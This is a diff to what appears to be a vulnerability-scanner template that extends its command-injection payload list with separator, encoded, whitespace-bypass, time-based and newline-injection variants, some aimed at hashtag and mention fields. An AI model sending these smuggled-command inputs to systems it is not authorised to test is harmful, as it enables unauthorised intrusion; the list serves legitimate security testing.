@@ -28,10 +28,38 @@ http:
 
     payloads:
       payload:
+        # Basic command injection
         - "test;id"
         - "test|whoami"
         - "test`id`"
         - "test$(whoami)"
+        - "test;uname -a"
+        - "test&&hostname"
+        - "test||pwd"
+        # Encoded and obfuscated
+        - "test;i\x64"
+        - "test;wh\x6fami"
+        - "test;${IFS}id"
+        - "test$IFS$9id"
+        # Time-based detection
+        - "test;sleep 5"
+        - "test|sleep 5"
+        - "test`sleep 5`"
+        - "test$(sleep 5)"
+        # With output redirection
+        - "test;id>/tmp/test"
+        - "test|id>test.txt"
+        # Nested commands
+        - "test;echo $(whoami)"
+        - "test|echo `id`"
+        # Special characters bypass
+        - "test%0Aid"
+        - "test%0D%0Aid"
+        - "test\nid"
+        - "test\rid"
+        # With hashtags (SNS context)
+        - "#test;id"
+        - "@user$(whoami)"
 
     extractors:
       - type: regex
